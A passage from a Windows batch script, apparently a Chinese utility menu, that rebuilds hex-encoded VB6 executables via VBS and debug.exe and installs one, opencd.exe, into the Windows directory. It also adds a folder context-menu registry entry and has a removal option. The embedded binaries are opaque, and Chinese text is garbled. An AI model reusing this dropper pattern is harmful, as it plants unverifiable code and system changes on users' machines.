@echo +"5F66646976725F6D3332690000005F5F766261467265655374724C697374000000005F61646A5F66646976725F6D3332000000005F61646A5F666469765F720000005F5F7662614934566172000000005F5F766261537472546F416E7369000000005F5F766261566172436F7079000000005F43496174616E0000005F5F7662"_>>debug.vbs
@echo +"615374724D6F7665000000005F616C6C6D756C0000005F434974616E000000005F4349657870000000005F5F766261467265655374720000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000031CFB345B8CB00000000030003000000580000800E0000004000008010000000280000800000000031CFB345B8CB00000000010001000000800000800000000031CFB345B8CB00000000010001000000980000800000000031CFB345B8CB00000000030031750000E000008032750000C800008033750000B0000080"_>>debug.vbs
@echo +"0000000031CFB345B8CB00000000010004080000F80000000000000031CFB345B8CB00000000010000000000080100000000000031CFB345B8CB00000000010000000000180100000000000031CFB345B8CB00000000010000000000280100000000000031CFB345B8CB0000000001000000000038010000504100002C020000"_>>debug.vbs
@echo +"B0040000000000007C43000030000000B004000000000000AC43000028010000B004000000000000D4440000E8020000B004000000000000BC47000030010000B00400000000000000000000000000002C0234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100"_>>debug.vbs
@echo +"0000010000000000000001000000000000000000000000000400000001000000000000000000000000000000440000000000560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000408B0048C010000010053007400720069006E00"_>>debug.vbs
@echo +"6700460069006C00650049006E0066006F0000006801000001003000380030003400300034004200300000002C000A00010043006F006D00700061006E0079004E0061006D006500000000005362005F4951719A0000000030000C0001004C006500670061006C0043006F00700079007200690067006800740000000F5CD191"_>>debug.vbs
@echo +"E55D5C4FA45B0000280008000100500072006F0064007500630074004E0061006D00650000000000E55D0B7A310000002C000A000100460069006C006500560065007200730069006F006E000000000031002E00300030000000000030000A000100500072006F006400750063007400560065007200730069006F006E000000"_>>debug.vbs
@echo +"31002E00300030000000000030000E00010049006E007400650072006E0061006C004E0061006D00650000006F00700065006E0063006400000000004000160001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006F00700065006E00630064002E006500780065000000000000000100"_>>debug.vbs
@echo +"030020200200010001003001000031752020100001000400E8020000327510101000010004002801000033752800000010000000200000000100040000000000C0000000000000000000000000000000000000000000000000008000008000000080800080000000800080008080000080808000C0C0C0000000FF0000FF0000"_>>debug.vbs
@echo +"00FFFF00FF000000FF00FF00FFFF0000FFFFFF000000000000000000000000000000000000000000000000000000000008F07700000008FFFFF07770000FFFFFFFF07000000FFFFFFFF00000000FFFFFFFF00000000FFFFF80000000000F80000EE0000000000EEEE0000000000EE00000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000FFFF0000FFFF0000FF8F0000F8030000C0010000C0070000C00F0000C00F0000C00F0000C00F0000C00F0000C07F0000C7FF0000FFFF0000FFFF0000FFFF00002800000020000000400000000100040000000000800200000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"00008000008000000080800080000000800080008080000080808000C0C0C0000000FF0000FF000000FFFF00FF000000FF00FF00FFFF0000FFFFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"000000000000000000000000000000000000000000000000000000000000000000000000008FFF0770000000000000000000008FFFFFFF07777000000000000008FFFFFFFFFFFF0777777000000000FFFFFFFFFFFFFFFF0777700000000000FFFFFFFFFFFFFFFF0770000000000000FFFFFFFFFFFFFFFF0000000000000000FF"_>>debug.vbs
@echo +"FFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFF88880000000000000000FFFFFFFF888800000000000000000000FF"_>>debug.vbs
@echo +"FF88880000EEEE000000000000000088880000EEEE000000000000000000000000EEEE000000000000000000000000EEEE00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC1FFFFFC007FFF80001FF8000007F800001FF800007FF80001FFF80001FFF80001FFF80001FFF80001FFF80001FF"_>>debug.vbs
@echo +"F80001FFF80001FFF80001FFF80001FFF80001FFF8003FFFF803FFFFF83FFFFFFBFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF2800000020000000400000000100010000000000000100000000000000000000000000000000000000000000FFFFFF00FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"_>>debug.vbs
@echo +"FFFFC1FFFFFC3C7FFFC3FC1FF83FFC07FBFFFC1FFBFFFC7FFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFC1FFFBFC3DFFFBC3C1FFF83C3FFFFBC3FFFFF83FFFFFFBFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"_>>debug.vbs
@echo +"FFFFC1FFFFFC007FFFC0001FF8000007F800001FF800007FF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF8003FFFF803FFFFF83FFFFFFBFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"">>debug.vbs
@echo with wscript.stdout:r=vbcrlf:for i=1 to len(str) step 48:.write "e"+hex(256+(i-1)/2):for j=i to i+46 step 2:.write " "+mid(str,j,2):next:.write r:next>>debug.vbs
@echo .write "rbx"+r+"0"+r+"rcx"+r+"5000"+r+"n debug.tmp"+r+"w"+r+"q"+r:end with>>debug.vbs&&cscript //nologo debug.vbs|debug.exe>nul&&ren debug.tmp "opencd.exe"&del debug.vbs
md %windir%\winzheng\
copy opencd.exe %windir%\winzheng\
del opencd.exe
cls
ECHO Windows Registry Editor Version 5.00>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\Folder\shell\opencd]>>SHOWALL.reg
ECHO @="�򿪹���">>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\Folder\shell\opencd\command]>>SHOWALL.reg
ECHO @=hex(2):43,00,3a,00,5c,00,57,00,49,00,4e,00,44,00,4f,00,57,00,53,00,5c,00,77,\>>SHOWALL.reg
ECHO   00,69,00,6e,00,7a,00,68,00,65,00,6e,00,67,00,5c,00,6f,00,70,00,65,00,6e,00,\>>SHOWALL.reg
ECHO   63,00,64,00,2e,00,65,00,78,00,65,00,00,00>>SHOWALL.reg

ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\opencd]>>SHOWALL.reg
ECHO @="�򿪹���">>SHOWALL.reg

ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\opencd\command]>>SHOWALL.reg
ECHO @=hex(2):43,00,3a,00,5c,00,57,00,49,00,4e,00,44,00,4f,00,57,00,53,00,5c,00,77,\>>SHOWALL.reg
ECHO   00,69,00,6e,00,7a,00,68,00,65,00,6e,00,67,00,5c,00,6f,00,70,00,65,00,6e,00,\>>SHOWALL.reg
ECHO   63,00,64,00,2e,00,65,00,78,00,65,00,00,00>>SHOWALL.reg

REGEDIT /S SHOWALL.reg
DEL /F /Q SHOWALL.reg

exit
goto 9
rem �������������������������������
goto 9
:list1_2a
MODE con: COLS=50 LINES=15
del /s /q %windir%\winzheng\opencd.exe

reg delete "HKCR\Folder\shell\opencd" /f
reg delete "HKLM\SOFTWARE\Classes\Folder\shell\opencd" /f
cls
echo.
echo                 �򿪹���ɾ���ɹ�!
echo.
echo                   �����������!
pause>nul
goto list9_9
rem �������������������������������
goto 10
:list10_10
MODE con: COLS=50 LINES=15
color 5f
cls
echo.���������У����Ժ�...
@echo str="4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000B80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000"_>>debug.vbs
@echo +"8F8AF9DBCBEB9788CBEB9788CBEB978848F79988CAEB9788A2F49E88CAEB978822F49A88CAEB978852696368CBEB97880000000000000000504500004C0103006447B4450000000000000000E0000F010B0106000020000000200000000000009C11000000100000003000000000400000100000001000000400000001000000"_>>debug.vbs
@echo +"04000000000000000050000000100000EE6B0000020000000000100000100000000010000010000000000000100000000000000000000000E41C00002800000000400000EC0800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000280200002000000000100000A00000000000000000000000000000000000000000000000000000002E746578740000000C100000001000000020000000100000000000000000000000000000200000602E64617461000000F8090000003000000010000000300000000000000000000000000000400000C0"_>>debug.vbs
@echo +"2E72737263000000EC08000000400000001000000040000000000000000000000000000040000040FC4521411000000000000000000000004D535642564D36302E444C4C000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
